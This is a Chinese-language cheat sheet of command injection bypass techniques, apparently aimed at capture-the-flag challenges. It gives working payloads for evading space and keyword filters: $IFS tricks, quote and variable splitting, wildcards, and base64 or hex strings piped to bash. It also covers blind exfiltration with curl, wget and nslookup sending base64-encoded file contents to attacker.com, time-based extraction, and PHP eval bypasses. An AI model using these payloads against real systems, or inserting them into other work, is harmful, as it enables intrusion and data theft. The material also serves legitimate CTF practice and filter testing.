# 命令注入绕过技巧大全

## 空格绕过

| 方法 | 示例 | 说明 |
|------|------|------|
| `${IFS}` | `cat${IFS}flag.php` | 内部字段分隔符（默认空格/Tab/换行） |
| `$IFS$9` | `cat$IFS$9flag.php` | `$9` 是当前 shell 第 9 个位置参数（空），防止变量名歧义 |
| `${IFS}` + 变量 | `a=$IFS;cat${a}flag` | 赋值后引用 |
| `<` | `cat<flag.php` | 重定向代替空格 |
| `%09` | `cat%09flag.php` | Tab 的 URL 编码 |
| `%0a` | `cat%0aflag.php` | 换行符 |
| `{cat,flag.php}` | `{cat,flag.php}` | Bash 大括号展开（仅 Bash） |
| `%0d` | `cat%0dflag.php` | 回车符 |

### 空格绕过选择策略
1. **首选** `$IFS$9` — 兼容性最好
2. **备选** `<` — 简洁，但 `<` 在某些上下文可能被过滤
3. **URL 场景** 用 `%09` 或 `%0a`

## 命令分隔符

| 分隔符 | 示例 | 说明 |
|--------|------|------|
| `;` | `id;cat flag` | 顺序执行 |
| `&&` | `id && cat flag` | 前成功才执行后 |
| `\|\|` | `id \|\| cat flag` | 前失败才执行后 |
| `\|` | `id \| cat flag` | 管道 |
| `%0a` | `id%0acat flag` | 换行执行 |
| `%0d%0a` | `id%0d%0acat flag` | CRLF |

## 命令/关键字绕过

### 字符串拼接
```bash
c'a't flag.php       # 单引号拼接
c"a"t flag.php       # 双引号拼接
c\at flag.php        # 反斜杠转义
```

### 变量拼接
```bash
a=c;b=at;$a$b flag.php
a=fl;b=ag;cat /$a$b
```

### 通配符
```bash
cat /f???.php        # ? 匹配单字符
cat /f*              # * 匹配任意字符
/bin/ca? /etc/pas?d  # 路径中也可用
cat /f[a-z]ag.php    # 字符类
```

### base64 编码
```bash
echo Y2F0IGZsYWcucGhw | base64 -d | bash
# Y2F0IGZsYWcucGhw = "cat flag.php"
```

### hex 编码
```bash
echo 63617420666c61672e706870 | xxd -r -p | bash
# 63617420666c61672e706870 = "cat flag.php"
```

### 使用未禁的替代命令

| 目标 | 原命令 | 替代命令 |
|------|--------|---------|
| 读文件 | cat | more / less / head / tail / tac / nl / od / xxd / sort / rev / paste / diff |
| 读文件 | cat flag | sed -n '1,100p' flag / awk '{print}' flag |
| 查找文件 | find | ls -la / dir / echo / locate |
| 下载 | wget | curl / nc / python -c 'import urllib...' |
| 写文件 | echo > | tee / printf / python -c |

## 无回显利用（Blind RCE）

当命令执行结果不可见时：

### 1. DNS 外带
```bash
curl http://attacker.com/$(cat flag.php | base64)
nslookup $(cat flag.php).attacker.com
```

### 2. HTTP 外带
```bash
curl http://attacker.com/?data=$(cat flag.php | base64)
wget http://attacker.com/?data=$(cat flag.php | base64)
```

### 3. 写文件到可访问路径
```bash
cat flag.php > /var/www/html/flag.txt
# 然后浏览器访问 http://target/flag.txt
```

### 4. 写入环境变量/临时文件
```bash
cp flag.php /tmp/flag
# 再通过另一个漏洞读取 /tmp/flag
```

### 5. 时间盲注
```bash
if [ $(cat flag.php | head -c 1) = 'N' ]; then sleep 3; fi
# 逐字符爆破
```

## PHP eval 特殊绕过

### 空格过滤在 eval 场景

```php
// 当 eval($cmd) 且 $cmd 中的空格被过滤
system("cat<flag.php");      // 重定向
system("cat${IFS}flag.php"); // IFS
system("cat$IFS$9flag.php"); // IFS + 位置参数
```

### 长度限制绕过

```php
// 当参数长度有限制（如 strlen > 18）
// 利用 PHP 变量展开
?a=system&b=cat flag.php
// eval($_GET[a]($_GET[b]));
```

### flag 关键字被替换

```php
// 当 "flag" 被替换为空格
// 使用通配符
cat /f*          # * 匹配 flag
cat /fl?g.php    # ? 匹配单个字符
cat /fla?.php
// 使用路径拼接
cat /fl''ag.php  # 空字符串拼接
cat /fl\ag.php   # 反斜杠（可能被解释为转义）
```
